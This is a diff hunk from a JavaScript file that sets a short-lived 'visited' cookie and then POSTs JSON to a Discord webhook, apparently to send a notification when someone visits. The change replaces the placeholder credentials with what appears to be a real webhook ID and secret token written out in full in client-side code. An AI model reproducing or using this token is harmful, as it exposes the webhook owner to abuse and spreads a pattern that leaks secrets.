@@ -36,7 +36,7 @@ function getCookie(name) {
 
     document.cookie = "visited=true; max-age=5; path=/";
 
-    fetch("https://discord.com/api/webhooks/TON_ID/TON_TOKEN", {
+    fetch("https://discord.com/api/webhooks/1480869073549136014/xCCNId_UdxCfYU3tMoU2st3XlglSalUOsBSXXwV3mCLv39HHSTDl02vYWchl_iQU9nxE", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
